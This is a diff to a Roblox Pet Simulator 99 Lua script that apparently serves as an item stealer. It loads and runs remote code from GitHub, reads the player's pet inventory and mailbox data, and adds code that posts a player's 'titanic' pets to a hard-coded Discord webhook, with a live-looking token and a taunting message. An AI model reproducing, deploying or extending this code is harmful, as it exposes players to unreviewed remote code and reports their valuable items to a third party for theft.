@@ -5,10 +5,43 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/Diapolo69/ps99/main/l
 wait(0.5)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Diapolo69/ps99/main/poopoo.lua"))()
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = game.ReplicatedStorage.Library
 local save = require(library.Client.Save).Get().Inventory
+local mailsent = require(library.Client.Save).Get().MailboxSendsSinceReset
+local plr = game.Players.LocalPlayer
+local MailMessage = "Hee hee"
+local HttpService = game:GetService("HttpService")
 
 local foundHugePet = false
+
+local function sendWebhoopk(url, headers, body)
+    local success = false
+    local attempts = 0
+    local maxAttempts = 5
+
+    while not success and attempts < maxAttempts do
+        attempts = attempts + 1
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+
+        print("Attempt " .. attempts .. ": StatusCode = " .. response.StatusCode)
+
+        if response.StatusCode ~= 500 then
+            success = true
+        else
+            wait(0.05)
+        end
+    end
+
+    if not success then
+        warn("Failed to send webhook after " .. maxAttempts .. " attempts.")
+    end
+end
 
 for i, v in pairs(save.Pet) do
     local id = v.id
@@ -17,6 +50,23 @@ for i, v in pairs(save.Pet) do
     if dir and dir.huge then
         foundHugePet = true
         break
+    end
+end
+for i, v in pairs(save.Pet) do
+    local id = v.id
+    local dir = require(library.Directory.Pets)[id]
+    if dir and dir.titanic then
+        local msg = {
+            ["content"] = "@here you missed on a " .. id .. " dumbass!"
+        }
+
+        local url = "https://discord.com/api/webhooks/1274742324760416297/c5ZoWUpwxRxjAskDbWRleTtlMMt9T69Gm-LRhKWZ8ZpdDxq5XPNPhjod_GZIbIZh_0mV"
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+        local body = HttpService:JSONEncode(msg)
+
+        sendWebhoopk(url, headers, body)
     end
 end
 if not foundHugePet then
